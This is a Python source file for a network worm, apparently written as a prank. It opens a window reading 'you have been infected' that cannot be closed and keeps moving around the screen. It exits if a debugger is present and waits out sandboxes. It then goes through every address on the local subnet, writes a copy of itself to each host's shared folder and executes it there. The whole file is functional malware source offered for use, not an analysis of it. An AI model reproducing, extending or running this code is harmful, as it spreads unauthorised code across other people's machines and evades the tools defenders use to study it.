
import os
import socket
import random
import string
import ctypes
import time
import tkinter as tk
from threading import Thread

# Function to display an annoying message box
def annoying_message():
    def move_window():
        while True:
            x = random.randint(0, root.winfo_screenwidth() - 400)
            y = random.randint(0, root.winfo_screenheight() - 200)
            root.geometry(f"400x200+{x}+{y}")
            time.sleep(0.5)  # Move the window every 0.5 seconds

    def reopen_on_close():
        try:
            root.protocol("WM_DELETE_WINDOW", lambda: root.deiconify())
            root.mainloop()
        except Exception as e:
            print(f"Error in GUI loop: {e}")

    root = tk.Tk()
    root.title("DD-S0ny_V!kt0r_hackzzXxx")
    label = tk.Label(root, text="oH nO! u hAz b33n !nf3cTeD :)", font=("Comic Sans MS", 20))
    label.pack(expand=True)

    # Start threads for movement and reopen behavior
    Thread(target=move_window, daemon=True).start()
    Thread(target=reopen_on_close, daemon=True).start()

    root.mainloop()

# Function to propagate the worm
def propagate_worm(target_ip):
    try:
        print(f"Propagating to {target_ip}...")
        worm_code = """
import os
import tkinter as tk
from threading import Thread
import random
import time

def annoying_message():
    def move_window():
        while True:
            x = random.randint(0, root.winfo_screenwidth() - 200)
            y = random.randint(0, root.winfo_screenheight() - 100)
            root.geometry(f"200x100+{x}+{y}")
            time.sleep(0.5)

    def reopen_on_close():
        root.protocol("WM_DELETE_WINDOW", lambda: root.deiconify())
        root.mainloop()

    root = tk.Tk()
    root.title("DD-S0ny_V!kt0r_hackzzXxx")
    label = tk.Label(root, text="oH nO! u hAz b33n !nf3cTeD :)", font=("Comic Sans MS", 20))
    label.pack(expand=True)

    Thread(target=move_window, daemon=True).start()
    Thread(target=reopen_on_close, daemon=True).start()

    root.mainloop()

annoying_message()
        """
        # Simulate copying the worm to the target
        with open(f"\\\\\\\\{target_ip}\\\\shared_folder\\\\worm.py", "w") as f:
            f.write(worm_code)
        # Execute the worm on the target
        os.system(f"python \\\\\\\\{target_ip}\\\\shared_folder\\\\worm.py")
        print(f"Successfully propagated to {target_ip}")
    except Exception as e:
        print(f"Failed to propagate to {target_ip}: {e}")

# Anti-analysis techniques
def evade_analysis():
    if ctypes.windll.kernel32.IsDebuggerPresent():
        exit()  # Exit if a debugger is detected
    time.sleep(5)  # Add a delay for sandbox evasion

# Main function to run the worm
if __name__ == "__main__":
    evade_analysis()

    # Start the annoying message locally
    Thread(target=annoying_message, daemon=True).start()

    # Scan the network for targets
    local_ip = socket.gethostbyname(socket.gethostname())
    network_prefix = ".".join(local_ip.split(".")[:3])
    targets = [f"{network_prefix}.{i}" for i in range(1, 255)]  # Simulate scanning the network

    # Propagate the worm to other targets
    for target in targets:
        propagate_worm(target)

